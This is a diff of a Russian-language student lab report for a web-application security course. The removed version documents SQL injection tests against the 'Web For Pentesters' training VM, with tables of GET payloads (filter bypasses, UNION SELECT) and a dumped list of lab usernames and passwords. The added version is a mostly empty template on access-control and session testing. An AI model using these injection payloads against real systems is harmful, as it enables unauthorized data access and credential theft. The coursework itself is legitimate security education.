@@ -22,7 +22,7 @@
 			</div>
 
 			<div class="title_work">
-				Отчет по лабораторно-практической работе №5<br/>
+				Отчет по лабораторно-практической работе №2<br/>
 				учебной дисциплины<br/>
 				“Обеспечение безопасности веб-приложений”<br/>
 				Тема: «Поиск уязвимостей к атакам SQL-injection»
@@ -57,738 +57,72 @@
 
 			<h3>Цель</h3>
 			<p>
-				Целью лабораторной работы является обучение методам и средствам
-				идентификации и эксплуатации уязвимостей в вебприложениях к атакам
-				SQL-injection.
+				Обучение методам и средствам тестирования защищенности
+				механизма управления доступом в веб-приложениях, современным методам
+				и средствам тестирования защищенности механизма управления сессиями в
+				веб-приложениях
 			</p>
 
 			<h3>Задания</h3>
-			<p>
-				Выполнить идентификацию и эксплуатацию уязвимостей к атакам SQLinjection.
-			</p>
+			<ol>
+				<li>
+					Выполнить тестирование защищенности механизма
+					управления доступом исследуемого веб-приложения.
+				</li>
+				<li>
+					Выполнить тестирование защищенности механизма
+					управления сессиями исследуемого веб-приложения. Последовательность
+					действий.
+				</li>
+			</ol>
 		</div>
 		
 		<div>
 			<h2>Ход работы</h2>
-
-			<h3>Шаг 1</h3>
+			<h3>Задание 1</h3>
+			<h4>Шаг 1</h4>
+			<div class="img">
+				<img src="img/1.1png">
+				<div>Регистрация в приложении</div>
+			</div>
+			<h4>Шаг 2</h4>
+			<h4>Шаг 3</h4>
+			<h4>Шаг 4</h4>
+			<h4>Шаг 5</h4>
+			<h4>Шаг 6</h4>
+			<h3>Задание 2</h3>
+			<h4>Шаг 1</h4>
+			<h4>Шаг 2</h4>
+			<h4>Шаг 3</h4>
+			<h4>Шаг 4</h4>
+			<h4>Шаг 5</h4>
+			<h3>Задание 3</h3>
+			<div class="img">
+				<pre>
+function getSessionId()
+{
+	return V_GetCookie("sessionid");
+}
+function setSessionId(id)
+{
+	V_SetCookie("sessionid", id);
+}</pre>
+				<div>Скрипт JS для установки и считывания сессии пользователя.</div>
+			</div>
 			<p>
 				Скачен образ «Web For Pentesters» с веб-сайта www.pentesterlab.com.
 				(На самом деле с преподавательской папки.)
 				И установлен на виртуальную машину.
 			</p>
-			<div class="img">
-				<img src="img/1.png">
-				<div>Запущеное приложение</div>
-			</div>
-			<p>
-				На каждом задании на выводе одинаковая структура таблицы.
-			</p>
-			<div class="img">
-				<img src="img/2.png">
-				<div>Штатная работа</div>
-			</div>
-
-			<h3>Шаг 2</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE name = '$name';
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root'
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root"
-						</td>
-						<td>
-							Пустая таблица.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR 1=1
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR 1=1#
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR 1=1 -
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR 1=1 /*
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR '1'='1
-						</td>
-						<td>
-							1/admin/10,<br>
-							2/root/30,<br>
-							3/user1/5,<br>
-							5/user2/2
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root' OR '1'='2
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example1.php?name=root'#sqli
-						</td>
-						<td>
-							Страница без таблицы. Вероятно ошибка при выполнении запроса.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 3</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example2.php?name=root
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE name = '$name';
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example2.php?name=root and 1=1
-						</td>
-						<td>
-							ERROR NO SPACE
-							(Нет таблицы.)
-						</td>
-						<td>
-							То же, но с проверкой на символ пробела.
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example2.php?name=root'%09and%09'1'='1
-							(%09 — табулция)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example2.php?name=root'%09and%09'1'='2
-							(%09 — табулция)
-						</td>
-						<td>
-							Пустая таблица
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example2.php?name=root'%2b%2b'
-							(%2b — +)
-						</td>
-						<td>
-							1/admin/10,<br>
-							2/root/30,<br>
-							3/user1/5,<br>
-							5/user2/2
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 4</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example3.php?name=root
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE name = '$name';
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example3.php?name=root and 1=1
-						</td>
-						<td>
-							ERROR NO SPACE
-						</td>
-						<td>
-							То же, но с проверкой на символ пробела.
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example3.php?name=root'/**/and/**/'1'='1
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example3.php?name=root'/**/and/**/'1'='2
-						</td>
-						<td>
-							Пустая таблица
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example3.php?name=root'%2b%2b'
-							(%2b — +)
-						</td>
-						<td>
-							1/admin/10,<br>
-							2/root/30,<br>
-							3/user1/5,<br>
-							5/user2/2
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 5</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=2
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE id = $id;
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=2'
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=2"
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=1%2b1
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=0%2b2
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example4.php?id=3-1
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 6</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE id = $id;
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2'
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2"
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=1%2b1
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=0%2b2
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=3-1
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 7</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE id = $id;
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2'
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2"
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=1%2b1
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=0%2b2
-							(%2b — +)
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=3-1
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=5-3
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
-
-			<h3>Шаг 8</h3>
-			<div class="img">
-				<table class="lined-table">
-					<tr>
-						<th>GET Запрос</th>
-						<th>Результат(id/name/age)</th>
-						<th>Предполагаемый запрос SQL</th>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							SELECT id, name, age FROM users WHERE id = $id;
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2'
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2"
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=1%2b1
-							(%2b — +)
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							?
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=3-1
-						</td>
-						<td>
-							ERROR INTEGER REQUIRED
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aand%201=1
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aand%201=2
-						</td>
-						<td>
-							Пустая таблица.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0A%23sqli
-						</td>
-						<td>
-							2/root/30
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<!-- -->
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%201
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%201,2
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%201,2,3
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%201,2,3,4 45
-						</td>
-						<td>
-							Нет таблицы.
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%201,2,3,4, 5
-						</td>
-						<td>
-							2/root/30,
-							1/2/3
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-					<tr>
-						<td>
-							sqli/example5.php?id=2%0Aunion%20select%20name, passwd,1,1,1 from users
-						</td>
-						<td>
-							2/root/30,
-							admin/admin/1,
-							root/admin21/1,
-							user1/secret/1,
-							user2/azerty/1
-						</td>
-						<td>
-							↓
-						</td>
-					</tr>
-				</table>
-				<div>Запросы и их результаты</div>
-			</div>
 		</div>
 		<div>
 			<h2>Вывод</h2>
 			<p>
-				Целью лабораторной работы является обучение методам и средствам
-				идентификации и эксплуатации уязвимостей в вебприложениях к атакам
-				SQL-injection.
+				В ходе выполнения практической работы были получены практические знания
+				по методам и средствам тестирования защищенности
+				механизма управления доступом в веб-приложениях, современным методам
+				и средствам тестирования защищенности механизма управления сессиями в
+				веб-приложениях.
 			</p>
 		</div>
 	</main>
